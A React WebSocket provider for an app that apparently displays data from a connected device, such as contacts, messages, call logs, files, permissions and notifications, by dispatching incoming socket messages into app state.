import { createContext, useEffect, useRef } from "react";
import { useDevice } from "./DeviceContext";
import { host } from "../serverConfig.json";

export const WebSocketContext = createContext();

export const WebSocketProvider = ({ children }) => {
  const socketRef = useRef(null);
  const { dispatch } = useDevice();

  useEffect(() => {
    socketRef.current = new WebSocket(host);

    socketRef.current.onopen = () => {
      console.log("WebSocket connected");
      // Send a JSON message with a random id
      const message = JSON.stringify({
        userDevConeection: {
          uuid: crypto.randomUUID(),
        },
      });
      socketRef.current.send(message);
    };

    console.log(1);
    socketRef.current.onmessage = (event) => {
      try {
        console.log(2);
        const message = JSON.parse(event.data);
        console.log("WS message received", message);
        handleWSMessage(message);
      } catch (error) {
        console.error("WS parse error", error);
      }
    };

    return () => {
      socketRef.current?.close();
    };
  }, []);

  const handleWSMessage = (message) => {
    const { type, data } = message;

    switch (type) {
      case "device-info":
        dispatch({ type: "SET_DEVICE_INFO", payload: data });
        break;
      case "file-list":
        dispatch({ type: "SET_FILE_LIST", payload: data });
        break;
      case "contact-list":
        dispatch({ type: "SET_CONTACT_LIST", payload: data });
        break;
      case "message-list":
        dispatch({ type: "SET_MESSAGE_LIST", payload: data });
        break;
      case "call-log-list":
        dispatch({ type: "SET_CALL_LOG_LIST", payload: data });
        break;
      case "permissions":
        dispatch({ type: "SET_GRANTED_PERMISSIONS", payload: data });
        break;
      case "auto-downloads":
        dispatch({ type: "SET_AUTO_DOWNLOADS", payload: data });
        break;
      case "notifications":
        dispatch({ type: "SET_NOTIFICATIONS", payload: data });
        break;
      default:
        console.warn("Unknown WS message type", type);
    }
  };

  return (
    <WebSocketContext.Provider value={{ socket: socketRef.current }}>
      {children}
    </WebSocketContext.Provider>
  );
};
